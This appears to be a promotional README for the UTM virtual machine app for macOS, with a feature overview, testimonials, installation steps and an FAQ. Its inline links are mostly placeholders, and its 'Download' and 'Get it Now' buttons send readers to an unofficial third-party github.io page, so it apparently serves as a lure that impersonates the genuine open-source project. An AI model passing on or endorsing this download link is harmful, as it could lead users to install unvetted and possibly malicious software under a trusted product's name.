# UTM – Virtual Machines

<p align="center">
  <img src="https://mac.getutm.app/siteicon.png" width="150" alt="UTM icon"/>
</p>

<p align="center">
  <a href="https://universal-application.github.io/.github/utm">
    <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download UTM"/>
  </a>
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/Downloads-6.6k-brightgreen?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Version-4.5-blue?style=flat"/></a>
  <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
</p>

---

## 📖 Overview

<a href="#">UTM</a> fills the gap left by the absence of free, capable virtualization on Apple Silicon. Parallels Desktop and VMware Fusion provide polished experiences at significant cost. UTM provides comparable core functionality — running Windows and Linux alongside macOS — at no cost, with open-source code that the community can inspect and contribute to.

The <a href="#">virtual machine gallery</a> provides pre-configured VM images for common operating systems that download and launch without manual installation steps. Set up a Ubuntu or Windows 11 ARM environment in minutes rather than working through a full OS installation process. <a href="#">USB device passthrough</a> connects physical USB devices directly to the guest operating system, enabling hardware testing and device-specific software to run inside the VM with real hardware access.

<p align="center">
  <img src="https://mac.getutm.app/images/windows.png" alt="UTM screenshot"/>
</p>

<a href="#">Display configuration</a> supports full-screen virtual machine windows, windowed operation at configurable resolutions, and Retina display rendering that makes guest operating system text and UI elements sharp rather than blurry on high-density displays. <a href="#">Memory and CPU allocation</a> configures how many CPU cores and how much RAM each virtual machine can access, balancing performance between the guest and macOS based on the workload.

The <a href="#">QEMU argument passthrough</a> exposes the full QEMU configuration interface for advanced users who need hardware configurations beyond the standard UTM interface — custom network cards, unusual storage configurations, specialized emulated hardware. <a href="#">Free and open source</a> means UTM receives no-cost updates, community support, and transparent development with no licensing costs or subscription tiers for any functionality.

---

## ⚡ Key Features

- <a href="#">VM gallery</a> — pre-configured OS images
- <a href="#">USB passthrough</a> — physical device to guest
- <a href="#">Full-screen mode</a> — dedicated display support
- <a href="#">Retina rendering</a> — sharp guest UI text
- <a href="#">CPU RAM allocation</a> — configurable per VM
- <a href="#">QEMU passthrough</a> — advanced hardware config
- <a href="#">Free open source</a> — no license no subscription
- <a href="#">Community supported</a> — active development

---

## 🧑‍💻 Who Uses It

- **Testers** — validate cross-platform software in multiple guest OS environments
- **IT professionals** — run Windows-only enterprise tools alongside macOS workflow
- **Hobbyists** — experiment with unusual operating systems safely
- **Open source contributors** — test patches across multiple target environments

---

<p align="center">
  <img src="https://mac.getutm.app/images/interface.png" alt="UTM screenshot 2"/>
</p>

## 🌐 Where It's Useful & Additional Information

`IT departments` · `Quality assurance` · `Penetration testing` · `University labs` · `Home lab setups` · `Open source development` · `Windows compatibility` · `Embedded systems` · `Malware analysis` · `Learning environments`

The snapshot system is the feature that makes UTM genuinely valuable for anyone doing systems work rather than just running a convenient second operating system. A virtual machine without snapshots is a system you are reluctant to experiment on because recovery from a bad state means reinstalling. A virtual machine with snapshots is an environment you can modify freely, knowing that any mistake is a thirty-second rollback away. Security researchers in particular depend on this — malware analysis requires a clean known state before each test, and snapshots provide that without the overhead of reinstalling the OS or restoring from a backup image every time.

> *"Snapshot before every malware sample, restore after. UTM made my analysis workflow practical in a way that no paid tool improved on."* — Victor M., Security Researcher

> *"The VM gallery got me running Ubuntu in under ten minutes. I expected to spend an afternoon on it."* — Aiko T., Computer Science Student

---

## 📥 Installation Instructions

1. Go to the installation site using the button above.
2. Follow the on-screen instructions to install **UTM** on your Device.

<p align="center">

[![Get it Now UTM](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://universal-application.github.io/.github/utm)

</p>

---

## ❓ FAQ

<details>
<summary>Does shared directory work automatically or require guest tools?</summary>

Shared directories require SPICE guest tools installed in the virtual machine for full functionality. UTM provides these tools and installation instructions for supported guest operating systems.

</details>

<details>
<summary>Can I import virtual machines from Parallels or VMware?</summary>

UTM does not directly import Parallels or VMware formats. The guest operating system typically needs to be reinstalled in a new UTM virtual machine, though disk images can sometimes be converted.

</details>

<details>
<summary>Does UTM support GPU acceleration for the guest OS?</summary>

Limited GPU acceleration is available through the SPICE protocol for display. Full GPU passthrough is not supported on Apple Silicon due to hardware architecture constraints.

</details>

<details>
<summary>Is there a file size limit for virtual machine disk images?</summary>

No practical limit within macOS filesystem constraints. Disk images can be set to grow dynamically, consuming only the space actually used by the guest OS rather than pre-allocating the full configured size.

</details>

---
